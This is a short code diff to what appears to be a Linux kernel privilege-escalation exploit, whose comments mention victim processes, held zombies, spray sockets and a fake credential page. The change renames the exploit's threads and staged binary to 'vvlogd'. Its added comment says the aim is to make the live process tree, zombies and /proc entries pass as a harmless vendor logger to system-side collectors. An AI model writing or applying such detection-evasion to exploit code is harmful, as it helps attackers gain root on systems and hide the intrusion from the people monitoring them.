@@ -770,7 +770,7 @@ static void *exec_thread(void *x)
     char *const envp[] = {NULL};
     (void)x;
     pin(2);
-    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
+    prctl(PR_SET_NAME, "vvlogd", 0, 0, 0);
     memset(&ev_none, 0, sizeof(ev_none));
     ev_none.sigev_notify = SIGEV_NONE;
     memset(&ev_victim, 0, sizeof(ev_victim));
@@ -3101,6 +3101,15 @@ int main(int argc, char **argv)
     g_child_entry = (argc > 1 && !strcmp(argv[1], "wait")) ||
                     (argv[0] && argv[0][0] == '\0');
     setvbuf(stdout, NULL, _IONBF, 0);
+
+    /* Process-name hygiene: victims exec /proc/self/exe, so their comm
+     * (and every held zombie's) is the STAGED binary's basename, and
+     * forked children inherit this thread's comm before that.  The
+     * runner stages the binary under the same bland name (vvlogd), so
+     * the live tree, zombies, /proc/<pid>/exe and cmdline all read as
+     * an unremarkable vendor logger during the permissive window and
+     * to system-side collectors. */
+    prctl(PR_SET_NAME, "vvlogd", 0, 0, 0);
 
     /* Never die from a closed stdout/stderr pipe. The parked parent holds the
      * fake-cred page via its spray sockets; a SIGPIPE kill would free it while
